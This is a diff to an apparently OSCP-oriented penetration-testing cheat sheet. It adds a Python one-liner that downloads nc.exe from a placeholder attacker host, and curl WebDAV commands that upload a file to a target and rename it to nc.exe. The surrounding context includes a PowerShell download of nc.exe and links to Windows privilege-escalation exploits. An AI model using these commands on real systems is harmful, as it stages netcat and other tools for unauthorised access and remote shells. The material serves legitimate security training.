@@ -266,6 +266,9 @@ end with
 * Download with Powershell 2
 `powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\Users\Public\Download\nc.exe')"`
 
+* Download with Python
+`c:\Python26\python.exe -c "import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()" ` 
+
 
 * Windows specific LPE vulns
 - https://www.exploit-db.com/exploits/11199/
@@ -322,7 +325,11 @@ sudo version? `sudo -V`
 Available compilers `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
 
 
-
+### Upload files using cUrl with WebDAV
+```
+curl -T accesschk.exe http://targetIP/nc.txt
+curl -X MOVE -v -H "Destination:http://targetIP/nc.exe" http://targetIP/nc.txt
+```
 
 ## References
 * [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
